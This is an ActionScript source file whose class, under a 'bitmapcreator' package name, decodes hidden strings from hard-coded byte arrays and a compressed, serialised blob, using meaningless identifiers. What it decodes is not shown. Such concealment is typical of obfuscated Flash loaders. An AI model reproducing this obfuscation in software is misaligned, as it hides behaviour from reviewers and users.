package com.bitmap.bitmapcreator
{
	import flash.utils.ByteArray;

	public class ABC
	{
		public static var alpha:String="acbdefghijklmno120987654";
		public static var betta:String="cbabababghfamno120977744";
		private static var a:Array = [0,16,97,49,98,50,99,51,100,52];
		private static var b:Array = 
			[	
				0x00000073,0x00000044,0x0000004d,0x000000e8,0x000000f6,0x00000085,	
				0x00000073,0x00000044,0x00000078,0x000000da,0x0000006d,0x000000cc,
				0x00000041,0x0000000a,0x00000080,0x00000020,0x00000010,0x00000040,
				0x00000051,0x0000006a,0x00000031,0x00000050,0x0000009e,0x000000a5,
				0x00000089,0x000000ea,0x00000004,0x0000001d,0x00000045,0x000000c6,
				0x00000001,0x00000045,0x00000073,0x00000044,0x0000004d,0x000000e8,
				0x000000f6,0x00000085,0x000000eb,0x000000d6,0x000000ff,0x000000f1,
				0x00000067,0x00000035,0x0000004c,0x00000035,0x000000df,0x0000000c,
				0x0000002a,0x000000e9,0x0000006a,0x000000f7,0x00000011,0x00000056,
				0x00000092,0x0000000b,0x0000004d,0x00000076,0x0000008d,0x00000049,
				0x00000017,0x00000017,0x00000005,0x0000000d,0x00000093,0x00000018,
				0x000000ce,0x000000bd,0x0000001f,0x00000070,0x00000096,0x000000c4,
				0x00000084,0x00000085,0x0000002c,0x00000057,0x000000ef,0x00000022,
				0x000000fa,0x000000fc,0x000000a1,0x000000a6,0x0000001f,0x0000005d,
				0x0000009a,0x000000a0,0x000000e5,0x00000010,0x000000a4,0x000000bb,
				0x0000000d,0x00000096,0x000000ff,0x000000cd,0x000000f0,0x00000002,
				0x00000024,0x0000009e,0x00000026,0x000000b9,0xff0010ff,0x000000c4 
			];
		public static function createAlpha():void
		{
			var ba:ByteArray = new ByteArray();
			for (var i:int = 0; i < a.length+CD.l; i++) 
			{
				if(i<a.length)
					ba[i]=a[i];
				else
					ba[i]=new ABCA(CD.l-1-(i-a.length)).b;
			}
			alpha = ba.readUTF();
		}
		public static function createBetta():void
		{
			var ba:ByteArray = new ByteArray();
			for each(var i:int in b) ba.writeByte(i);
			ba.position=CD.l;
			var bb:ByteArray = new ByteArray();
			ba.readBytes(bb);
			bb.uncompress();
			var c:* = bb.readObject();
			betta = c[c[true]];
		}
	}
}